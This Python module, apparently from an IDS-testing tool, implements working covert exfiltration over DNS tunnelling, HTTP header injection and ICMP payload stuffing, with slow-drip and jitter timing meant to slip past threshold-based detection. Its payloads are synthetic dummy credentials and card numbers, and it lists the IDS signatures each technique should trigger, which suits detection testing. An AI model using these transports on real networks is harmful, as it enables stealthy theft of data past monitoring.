#!/usr/bin/env python3
# agent/modules/exfil_module.py
# =============================================================================
#  MIAT — Data Exfiltration Simulation Module
#
#  PURPOSE:
#    Simulate covert data exfiltration techniques to test whether the BARC
#    IDS detects data leaving the network boundary. Uses only DUMMY/SYNTHETIC
#    data — no real sensitive information is ever transmitted.
#
#  ARCHITECTURE (following your design):
#    PayloadGenerator  → creates dummy data to exfiltrate
#    ChunkManager      → splits payload into safe-sized pieces per technique
#    Transport Layer   → DNSTunnel | HTTPHeaderInject | ICMPStuffer
#    DetectionSurface  → maps each technique to its IDS signatures
#    BehaviorProfile   → Burst | SlowDrip | Jitter timing patterns
#    TransferEngine    → orchestrates technique + profile
#    ExfilReporter     → records telemetry, streams live, posts to server
#
#  TECHNIQUES:
#    DNS Tunnelling     — encode data in subdomain labels
#    HTTP Header Inject — hide data in User-Agent / custom headers
#    ICMP Stuffing      — embed data in ICMP echo payload (needs root+scapy)
#
#  INSTALL:
#    pip install requests dnspython scapy
#    Windows ICMP: also install Npcap from npcap.com
#
#  USAGE:
#    engine = TransferEngine(agent_ref=self, config={
#        'technique':  'dns',           # dns | http | icmp
#        'profile':    'slow_drip',     # burst | slow_drip | jitter
#        'target':     '192.168.1.1',   # target IP or domain
#        'payload':    'secret_data_123',
#        'chunk_size': 20,
#    })
#    engine.run()
# =============================================================================

import base64
import hashlib
import json
import logging
import os
import random
import string
import time
import threading
from datetime import datetime, timezone
from typing    import List, Dict, Optional

logger = logging.getLogger('MIAT-Exfil')

# Optional imports — handled gracefully if missing
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    logger.warning("requests not installed — HTTP injection unavailable. pip install requests")

try:
    import dns.resolver
    import dns.exception
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False
    logger.warning("dnspython not installed — DNS tunnel unavailable. pip install dnspython")

try:
    from scapy.all import IP, ICMP, send, conf
    conf.verb = 0      # suppress scapy output
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logger.warning("scapy not installed — ICMP unavailable. pip install scapy")


# =============================================================================
# LAYER 1: PAYLOAD GENERATOR
# Creates realistic-looking dummy data to simulate exfiltration scenarios.
# All data is completely synthetic — no real sensitive info.
# =============================================================================

class PayloadGenerator:
    """
    Generates dummy payloads that look like real sensitive data.
    The IDS should react the same whether data is real or dummy —
    it detects the TRANSPORT pattern, not the content meaning.
    """

    TEMPLATES = {
        'credentials': (
            "username=admin&password=P@ssw0rd123&token=eyJhbGciOiJSUzI1NiJ9"
        ),
        'pii': (
            "name=John Doe,dob=1990-01-15,ssn=123-45-6789,email=john@example.com"
        ),
        'api_key': (
            "api_key=AKIA1234567890ABCDEF&secret=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
        ),
        'db_dump': (
            "id,name,email,credit_card\n"
            "1,Alice,alice@example.com,4111111111111111\n"
            "2,Bob,bob@example.com,5500005555555555\n"
            "3,Carol,carol@example.com,340000000000009"
        ),
        'config': (
            "DB_HOST=192.168.1.100\nDB_USER=root\nDB_PASS=SuperSecret!\n"
            "SMTP_PASS=EmailPass123\nSECRET_KEY=django-insecure-abc123"
        ),
        'custom': '',   # filled in from config
    }

    def generate(self, payload_type: str = 'credentials',
                 custom_payload: str = '') -> str:
        """
        Generate a dummy payload string.
        Returns the raw string — ChunkManager will split it.
        """
        if payload_type == 'custom' and custom_payload:
            return custom_payload

        template = self.TEMPLATES.get(payload_type, self.TEMPLATES['credentials'])

        # Add timestamp and run ID to make each payload unique
        run_id    = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        timestamp = datetime.now(tz=timezone.utc).strftime('%Y%m%dT%H%M%SZ')
        return f"[MIAT-EXFIL-SIM][{run_id}][{timestamp}] {template}"


# =============================================================================
# LAYER 2: CHUNK MANAGER
# Splits payload into pieces safe for each transport technique.
# DNS labels: max 63 chars. HTTP headers: max 256 chars. ICMP: max 1472 bytes.
# =============================================================================

class ChunkManager:
    """
    Splits a payload string into chunks sized for the chosen transport.

    DNS tunnelling:  max 30 chars per chunk (after base32 encoding expands it)
    HTTP injection:  max 100 chars per chunk (header value limit)
    ICMP stuffing:   max 100 bytes per chunk (safe ICMP payload size)
    """

    CHUNK_SIZES = {
        'dns':  20,    # raw bytes before base32 → ~32 char encoded label
        'http': 100,   # characters per header value chunk
        'icmp': 64,    # bytes per ICMP payload chunk
    }

    def split(self, payload: str, technique: str,
              override_size: int = None) -> List[bytes]:
        """
        Split payload into chunks.
        Returns list of bytes chunks.
        """
        size    = override_size or self.CHUNK_SIZES.get(technique, 20)
        encoded = payload.encode('utf-8')
        chunks  = [encoded[i:i+size] for i in range(0, len(encoded), size)]
        logger.info(
            f"ChunkManager: {len(encoded)} bytes → "
            f"{len(chunks)} chunks of ~{size} bytes ({technique})"
        )
        return chunks

    def encode_for_dns(self, chunk: bytes) -> str:
        """
        Encode a bytes chunk for DNS subdomain use.
        Base32 produces only A-Z and 2-7 — valid in DNS labels.
        Strips padding '=' characters (not valid in DNS).

        Example: b'secret_data' → 'ONXW2ZJAMRQXIYLNMUQQ'
        """
        return base64.b32encode(chunk).decode().rstrip('=').lower()

    def encode_for_http(self, chunk: bytes) -> str:
        """
        Encode chunk as base64 for HTTP header values.
        Base64 is safe in header values and looks like a token.

        Example: b'secret_data' → 'c2VjcmV0X2RhdGE='
        """
        return base64.b64encode(chunk).decode()

    def decode_dns(self, label: str) -> bytes:
        """Decode a base32 DNS label back to bytes (for verification)."""
        padded = label.upper() + '=' * (-len(label) % 8)
        return base64.b32decode(padded)


# =============================================================================
# LAYER 3: DETECTION SURFACE
# Maps each technique to the IDS signatures it generates.
# Used in telemetry reporting so results explain what the IDS should see.
# =============================================================================

class DetectionSurface:
    """
    Documents the detection signatures each technique produces.
    This is what makes the module useful for IDS evaluation —
    we know exactly what the IDS should catch.
    """

    SIGNATURES = {
        'dns': {
            'name':       'DNS Tunnelling',
            'signatures': [
                'Unusually long subdomain labels (>30 chars)',
                'High query volume to a single parent domain',
                'Subdomain entropy significantly higher than normal',
                'Repeated queries to non-existent parent domain',
                'Base32/Base64 character pattern in subdomains',
            ],
            'threshold':  'Typically flagged after 5+ long-label queries',
            'severity':   'HIGH',
        },
        'http': {
            'name':       'HTTP Header Injection',
            'signatures': [
                'Non-standard User-Agent string with high entropy',
                'Unusual X-Custom-Header values',
                'Repeated requests with base64-like header content',
                'Header value length exceeding normal bounds',
            ],
            'threshold':  'DPI required — volume-based detection harder',
            'severity':   'MEDIUM',
        },
        'icmp': {
            'name':       'ICMP Payload Stuffing',
            'signatures': [
                'ICMP echo payload larger than standard 8 bytes',
                'Non-zero ICMP payload content (default is zeros)',
                'Repeated ICMP to single destination',
                'ICMP payload containing printable ASCII text',
            ],
            'threshold':  'Deep packet inspection required',
            'severity':   'HIGH',
        },
    }

    def get(self, technique: str) -> dict:
        return self.SIGNATURES.get(technique, {})

    def describe(self, technique: str) -> str:
        """Human-readable description of what IDS should see."""
        sig = self.get(technique)
        if not sig:
            return 'Unknown technique'
        lines = [f"{sig['name']} — IDS Signatures:"]
        for s in sig['signatures']:
            lines.append(f"  • {s}")
        lines.append(f"  Threshold: {sig['threshold']}")
        return '\n'.join(lines)


# =============================================================================
# LAYER 4A: DNS TUNNELLING TRANSPORT
# =============================================================================

class DNSTunnel:
    """
    DNS Tunnelling technique.

    How it works:
      1. Encode each data chunk as a base32 string
      2. Send it as a subdomain query: <encoded_chunk>.<session>.<domain>
         e.g. onxw2zjamrqx.abc123.exfil-test.local
      3. IDS sees: long subdomain label, high entropy, repeated queries

    The parent domain (.exfil-test.local or similar) is just for the
    query structure — it doesn't need to resolve. NXDOMAIN is expected.
    """

    def __init__(self, config: dict, chunk_manager: ChunkManager):
        self.config        = config
        self.chunk_manager = chunk_manager
        self.parent_domain = config.get('dns_domain', 'exfil-test.local')
        self.dns_server    = config.get('dns_server', None)
        self.timeout       = config.get('dns_timeout', 3)
        self.session_id    = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

    def send_chunk(self, chunk: bytes, sequence: int) -> dict:
        """
        Send one chunk via DNS tunnel.
        Returns result dict with domain queried and outcome.
        """
        if not DNS_AVAILABLE:
            return {
                'technique': 'dns', 'sequence': sequence,
                'status': 'ERROR', 'error': 'dnspython not installed',
            }

        encoded = self.chunk_manager.encode_for_dns(chunk)

        # Build the tunnel query domain:
        # <encoded_data>.<sequence>.<session>.<parent_domain>
        # e.g. onxw2zjamrqx.001.abc123.exfil-test.local
        query_domain = f"{encoded}.{sequence:03d}.{self.session_id}.{self.parent_domain}"

        logger.debug(
            f"DNS tunnel query: {query_domain} "
            f"(label len={len(encoded)}, raw={len(chunk)}B)"
        )

        resolver          = dns.resolver.Resolver()
        resolver.timeout  = self.timeout
        resolver.lifetime = self.timeout
        if self.dns_server:
            resolver.nameservers = [self.dns_server]

        start   = time.monotonic()
        outcome = 'NXDOMAIN'   # expected — parent domain doesn't exist

        try:
            resolver.resolve(query_domain, 'A')
            outcome = 'RESOLVED'
        except dns.resolver.NXDOMAIN:
            outcome = 'NXDOMAIN'    # ← expected outcome for tunnel
        except dns.exception.Timeout:
            outcome = 'TIMEOUT'
        except Exception as exc:
            outcome = f'ERROR: {exc}'

        elapsed_ms = (time.monotonic() - start) * 1000

        return {
            'technique':     'dns',
            'sequence':      sequence,
            'query_domain':  query_domain,
            'encoded_label': encoded,
            'label_length':  len(encoded),
            'raw_bytes':     len(chunk),
            'outcome':       outcome,
            'elapsed_ms':    round(elapsed_ms, 2),
            'timestamp':     datetime.now(tz=timezone.utc).isoformat(),
        }

    def describe_packet(self, chunk: bytes, sequence: int) -> str:
        """What a packet looks like for live dashboard display."""
        encoded = self.chunk_manager.encode_for_dns(chunk)
        domain  = f"{encoded}.{sequence:03d}.{self.session_id}.{self.parent_domain}"
        return f"DNS  {domain[:60]}{'...' if len(domain)>60 else ''}"


# =============================================================================
# LAYER 4B: HTTP HEADER INJECTION TRANSPORT
# =============================================================================

class HTTPHeaderInject:
    """
    HTTP Header Injection technique.

    How it works:
      1. Encode each data chunk as base64
      2. Inject it into HTTP request headers:
         User-Agent: Mozilla/5.0 <base64_chunk>
         X-Request-ID: <base64_chunk>
         Referer: https://cdn.example.com/<base64_chunk>
      3. Send to a target HTTP server
      4. IDS sees: unusual header values, high entropy in User-Agent

    The target should be an HTTP server in the lab that accepts requests.
    In real attacks this would be an attacker's server.
    """

    # Header rotation — cycles through different headers to vary the pattern
    HEADER_TEMPLATES = [
        ('User-Agent',        'Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 {}'),
        ('X-Request-ID',      '{}'),
        ('Referer',           'https://cdn.cloudflare.com/assets/{}'),
        ('X-Forwarded-For',   '10.0.0.{}.{}'),
        ('Accept-Language',   'en-US,en;q=0.9,{}'),
    ]

    def __init__(self, config: dict, chunk_manager: ChunkManager):
        self.config        = config
        self.chunk_manager = chunk_manager
        self.target_url    = config.get('http_target', 'http://192.168.1.1')
        self.timeout       = config.get('http_timeout', 5)
        self.session_id    = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        self._header_idx   = 0

    def send_chunk(self, chunk: bytes, sequence: int) -> dict:
        """Send one chunk hidden in an HTTP header."""
        if not REQUESTS_AVAILABLE:
            return {
                'technique': 'http', 'sequence': sequence,
                'status': 'ERROR', 'error': 'requests not installed',
            }

        encoded = self.chunk_manager.encode_for_http(chunk)

        # Rotate through header templates for variety
        header_name, header_template = self.HEADER_TEMPLATES[
            self._header_idx % len(self.HEADER_TEMPLATES)
        ]
        self._header_idx += 1

        header_value = header_template.format(encoded)

        # Build the full headers dict
        headers = {
            'User-Agent':      'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept':          'text/html,application/xhtml+xml',
            'Connection':      'keep-alive',
            header_name:       header_value,  # ← injected data
            'X-Session':       self.session_id,
            'X-Seq':           str(sequence),
        }

        logger.debug(
            f"HTTP inject → {self.target_url} "
            f"header={header_name}: {header_value[:40]}..."
        )

        start  = time.monotonic()
        status = 0
        error  = ''

        try:
            resp   = requests.get(
                self.target_url,
                headers = headers,
                timeout = self.timeout,
                verify  = False,   # skip SSL verify for lab targets
                allow_redirects = True,
            )
            status = resp.status_code
        except requests.exceptions.ConnectionError:
            error  = 'Connection refused'
            status = 0
        except requests.exceptions.Timeout:
            error  = 'Timeout'
            status = 0
        except Exception as exc:
            error  = str(exc)
            status = 0

        elapsed_ms = (time.monotonic() - start) * 1000

        return {
            'technique':     'http',
            'sequence':      sequence,
            'target_url':    self.target_url,
            'header_name':   header_name,
            'header_value':  header_value[:80],
            'encoded_length': len(encoded),
            'raw_bytes':     len(chunk),
            'http_status':   status,
            'error':         error,
            'elapsed_ms':    round(elapsed_ms, 2),
            'timestamp':     datetime.now(tz=timezone.utc).isoformat(),
        }

    def describe_packet(self, chunk: bytes, sequence: int) -> str:
        encoded = self.chunk_manager.encode_for_http(chunk)
        name, tmpl = self.HEADER_TEMPLATES[self._header_idx % len(self.HEADER_TEMPLATES)]
        value = tmpl.format(encoded)
        return f"HTTP GET {self.target_url} | {name}: {value[:50]}{'...' if len(value)>50 else ''}"


# =============================================================================
# LAYER 4C: ICMP PAYLOAD STUFFING TRANSPORT
# =============================================================================

class ICMPStuffer:
    """
    ICMP Payload Stuffing technique.

    How it works:
      1. Take each data chunk as raw bytes
      2. Craft a custom ICMP echo request with the data as the payload
         (normal ping has an 8-byte timestamp payload or zeros)
      3. Send to target IP using scapy
      4. IDS sees: oversized ICMP payload, non-zero/non-standard content

    REQUIREMENTS:
      - Windows: Run terminal as Administrator + install Npcap (npcap.com)
      - Linux:   sudo python agent.py --exfil --technique icmp
      - scapy:   pip install scapy
    """

    def __init__(self, config: dict):
        self.config    = config
        self.target_ip = config.get('target', '192.168.1.1')
        self.ttl       = config.get('icmp_ttl', 64)
        self.iface     = config.get('icmp_iface', None)  # None = auto-select

    def send_chunk(self, chunk: bytes, sequence: int) -> dict:
        """Craft and send one ICMP packet with data embedded in payload."""
        if not SCAPY_AVAILABLE:
            return {
                'technique': 'icmp', 'sequence': sequence,
                'status': 'ERROR',
                'error':  (
                    'scapy not installed (pip install scapy) or '
                    'Npcap not installed on Windows (npcap.com)'
                ),
            }

        # Add sequence marker to payload so packets can be reassembled
        # Format: [SEQ:001][data bytes]
        seq_header = f"[SEQ:{sequence:03d}]".encode()
        payload    = seq_header + chunk

        logger.debug(
            f"ICMP → {self.target_ip} "
            f"payload={len(payload)}B (normal=8B)"
        )

        start = time.monotonic()
        error = ''
        sent  = False

        try:
            packet = (
                IP(dst=self.target_ip, ttl=self.ttl) /
                ICMP(type=8, code=0, seq=sequence) /
                payload
            )
            if self.iface:
                send(packet, iface=self.iface)
            else:
                send(packet)
            sent = True

        except PermissionError:
            error = 'Permission denied — run as Administrator (Windows) or sudo (Linux)'
        except Exception as exc:
            error = str(exc)

        elapsed_ms = (time.monotonic() - start) * 1000

        return {
            'technique':    'icmp',
            'sequence':     sequence,
            'target_ip':    self.target_ip,
            'payload_bytes': len(payload),
            'normal_icmp':  8,      # standard ICMP payload is 8 bytes
            'excess_bytes': len(payload) - 8,
            'sent':         sent,
            'error':        error,
            'elapsed_ms':   round(elapsed_ms, 2),
            'timestamp':    datetime.now(tz=timezone.utc).isoformat(),
        }

    def describe_packet(self, chunk: bytes, sequence: int) -> str:
        seq_hdr  = f"[SEQ:{sequence:03d}]".encode()
        total    = len(seq_hdr) + len(chunk)
        return f"ICMP ECHO → {self.target_ip} | payload={total}B (normal=8B, excess={total-8}B)"


# =============================================================================
# LAYER 5: BEHAVIORAL PROFILES
# Controls timing between chunk transmissions.
# =============================================================================

class BehaviorProfile:
    """
    Controls HOW FAST chunks are sent.
    Same data, different timing = different IDS detection patterns.

    burst:      Send all chunks as fast as possible
                → Tests volume-based IDS detection
                → Most likely to trigger immediate alert

    slow_drip:  Send one chunk every N seconds (default 10s)
                → Tests whether IDS has long-term memory
                → May evade threshold-based detection

    jitter:     Random delay between min and max seconds
                → Mimics human/natural timing
                → Hardest for time-based IDS to detect
    """

    def __init__(self, profile: str, config: dict):
        self.profile = profile
        self.config  = config

    def wait(self, chunk_index: int, total_chunks: int) -> float:
        """
        Calculate and apply the delay for this chunk.
        Returns the actual delay applied in seconds.
        """
        if self.profile == 'burst':
            delay = 0.05   # 50ms between packets — as fast as practical
        elif self.profile == 'slow_drip':
            delay = self.config.get('drip_interval', 10.0)
        elif self.profile == 'jitter':
            min_d = self.config.get('jitter_min', 1.0)
            max_d = self.config.get('jitter_max', 8.0)
            delay = random.uniform(min_d, max_d)
        else:
            delay = 1.0

        if chunk_index < total_chunks - 1:   # no wait after last chunk
            time.sleep(delay)

        return delay

    def describe(self) -> str:
        if self.profile == 'burst':
            return 'Burst (50ms between chunks — maximum speed)'
        elif self.profile == 'slow_drip':
            interval = self.config.get('drip_interval', 10)
            return f'Slow Drip (one chunk every {interval}s)'
        elif self.profile == 'jitter':
            lo = self.config.get('jitter_min', 1)
            hi = self.config.get('jitter_max', 8)
            return f'Jitter (random {lo}–{hi}s between chunks)'
        return self.profile


# =============================================================================
# LAYER 6: EXFIL REPORTER (Telemetry Engine)
# Records every packet, streams live to dashboard, posts summary to server.
# =============================================================================

class ExfilReporter:
    """
    Telemetry Engine — collects every packet result and builds the report.
    Streams each packet result live via WebSocket so the browser shows
    a real-time feed of the exfiltration in progress.
    """

    def __init__(self, agent_ref, technique: str,
                 profile: str, config: dict):
        self.agent_ref  = agent_ref
        self.technique  = technique
        self.profile    = profile
        self.config     = config
        self.packets    = []
        self.start_time = None
        self.end_time   = None
        self.detection  = DetectionSurface()

    def record(self, packet_result: dict) -> None:
        self.packets.append(packet_result)

    def stream_live(self, description: str, sequence: int,
                    total: int, result: dict) -> None:
        """Stream one packet result to the browser dashboard via WebSocket."""
        if not (self.agent_ref and hasattr(self.agent_ref, 'ws_thread')):
            return
        ws = self.agent_ref.ws_thread
        if not (ws and ws.connected):
            return

        status = result.get('outcome') or ('SENT' if result.get('sent') else 'ERROR')
        status = result.get('http_status') or status
        error  = result.get('error', '')

        line = (
            f"[{datetime.now().strftime('%H:%M:%S')}] "
            f"[{sequence:02d}/{total}] "
            f"{description[:70]}"
            f"{' ← ' + str(status) if status else ''}"
            f"{' ERR:' + error[:30] if error else ''}"
        )
        ws.send_module_output('exfil', line)

    def build_summary(self) -> dict:
        total        = len(self.packets)
        successful   = sum(
            1 for p in self.packets
            if p.get('sent') or p.get('outcome') in ('NXDOMAIN', 'RESOLVED')
            or (p.get('http_status', 0) > 0)
        )
        errors       = sum(1 for p in self.packets if p.get('error'))
        duration     = 0.0
        if self.start_time and self.end_time:
            duration = round(self.end_time - self.start_time, 2)

        avg_interval = round(duration / max(total - 1, 1), 2) if total > 1 else 0
        sig          = self.detection.get(self.technique)

        return {
            'technique':         self.technique,
            'profile':           self.profile,
            'total_chunks':      total,
            'successful':        successful,
            'errors':            errors,
            'duration_sec':      duration,
            'avg_interval_sec':  avg_interval,
            'ids_signatures':    sig.get('signatures', []),
            'ids_severity':      sig.get('severity', 'UNKNOWN'),
            'ids_threshold':     sig.get('threshold', ''),
            'packets':           self.packets,
        }

    def post_to_server(self) -> None:
        """Post the full exfiltration report to the Django server."""
        if not self.agent_ref:
            return
        summary = self.build_summary()

        logger.info(
            f"Exfil complete — technique={self.technique}, "
            f"profile={self.profile}, "
            f"chunks={summary['total_chunks']}, "
            f"success={summary['successful']}, "
            f"duration={summary['duration_sec']}s"
        )

        if hasattr(self.agent_ref, 'ws_thread'):
            ws = self.agent_ref.ws_thread
            if ws and ws.connected:
                ws.send_module_output(
                    'exfil',
                    f"{'─'*60}\n"
                    f"COMPLETE: {summary['total_chunks']} chunks | "
                    f"{summary['successful']} sent | "
                    f"{summary['duration_sec']}s"
                )

        try:
            self.agent_ref.http.post('/api/agent/exfil/results/', {
                'technique':        self.technique,
                'profile':          self.profile,
                'total_chunks':     summary['total_chunks'],
                'successful':       summary['successful'],
                'errors':           summary['errors'],
                'duration_sec':     summary['duration_sec'],
                'avg_interval_sec': summary['avg_interval_sec'],
                'ids_signatures':   summary['ids_signatures'],
                'ids_severity':     summary['ids_severity'],
                'target':           self.config.get('target', ''),
                'packets':          self.packets,
            })
            logger.info("Exfil results posted to server")
        except Exception as exc:
            logger.error(f"Failed to post exfil results: {exc}")


# =============================================================================
# LAYER 7: TRANSFER ENGINE
# Orchestrates technique + profile — the main entry point.
# =============================================================================

class TransferEngine:
    """
    Main controller. Combines:
      PayloadGenerator → ChunkManager → Transport → BehaviorProfile → Reporter

    Usage:
        engine = TransferEngine(agent_ref=self, config={...})
        engine.run()
    """

    def __init__(self, agent_ref, config: dict):
        self.agent_ref = agent_ref
        self.config    = config
        self.running   = False
        self._stop     = threading.Event()

        # Instantiate all layers
        self.payload_gen   = PayloadGenerator()
        self.chunk_mgr     = ChunkManager()
        self.detection     = DetectionSurface()

        technique = config.get('technique', 'dns')
        profile   = config.get('profile',   'burst')

        self.behavior = BehaviorProfile(profile, config)
        self.reporter = ExfilReporter(agent_ref, technique, profile, config)

        # Select transport
        if technique == 'dns':
            self.transport = DNSTunnel(config, self.chunk_mgr)
        elif technique == 'http':
            self.transport = HTTPHeaderInject(config, self.chunk_mgr)
        elif technique == 'icmp':
            self.transport = ICMPStuffer(config)
        else:
            raise ValueError(f"Unknown technique: {technique}. Use: dns | http | icmp")

    def run(self) -> dict:
        """Execute the full exfiltration simulation. Returns summary dict."""
        technique    = self.config.get('technique',    'dns')
        profile      = self.config.get('profile',      'burst')
        payload_type = self.config.get('payload_type', 'credentials')
        custom       = self.config.get('payload',      '')
        chunk_size   = self.config.get('chunk_size',   None)

        logger.info(
            f"Exfil starting — technique={technique}, "
            f"profile={self.behavior.describe()}, "
            f"payload={payload_type}"
        )

        # Log detection surface
        logger.info(self.detection.describe(technique))

        # Notify dashboard
        if hasattr(self.agent_ref, 'ws_thread'):
            ws = self.agent_ref.ws_thread
            if ws and ws.connected:
                ws.send_module_output(
                    'exfil',
                    f"EXFIL [{technique.upper()}] [{profile.upper()}] starting...\n"
                    + self.detection.describe(technique)
                )

        # Generate payload
        payload = self.payload_gen.generate(payload_type, custom)
        logger.info(f"Payload: {len(payload)} chars")

        # Split into chunks
        chunks = self.chunk_mgr.split(payload, technique, chunk_size)
        total  = len(chunks)

        self.running = True
        self.reporter.start_time = time.time()

        for i, chunk in enumerate(chunks, start=1):
            if self._stop.is_set():
                logger.info("Exfil stopped by request")
                break

            # Send via chosen transport
            result = self.transport.send_chunk(chunk, i)

            # Get human-readable description
            try:
                description = self.transport.describe_packet(chunk, i)
            except Exception:
                description = f"chunk {i}/{total}"

            # Record and stream
            self.reporter.record(result)
            self.reporter.stream_live(description, i, total, result)

            logger.debug(f"[{i}/{total}] {description[:60]}")

            # Apply behavioral timing
            self.behavior.wait(i, total)

        self.reporter.end_time = time.time()
        self.running = False

        # Post to server
        self.reporter.post_to_server()

        return self.reporter.build_summary()

    def stop(self):
        self._stop.set()